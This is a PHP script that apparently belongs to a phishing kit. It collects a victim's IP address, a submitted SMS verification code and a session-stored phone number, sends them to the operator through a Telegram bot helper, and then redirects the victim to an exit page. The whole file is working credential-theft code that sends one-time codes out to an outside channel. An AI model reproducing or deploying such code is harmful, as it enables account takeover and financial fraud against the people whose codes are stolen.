<?php

require_once 'telegram.php';

session_start();
$ip = getenv("REMOTE_ADDR");

          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

   
            $Ak47 .= "|𝘏𝘈 𝘚𝘔𝘚 𝘈𝘓𝘣𝘢𝘛𝘢𝘓 ²|".$ip."\n";
            $Ak47 .= "┌─╼╼ ".$_POST['sms']."\n";
            $Ak47 .= "└─╼ ".$_SESSION['number']."\n";
            $Ak47 .= "▬▬▬▬▬▬▬▬▬▬\n";
            

             telegram_send(urlencode($Ak47));
header("Location: ../exit.php");


 ?>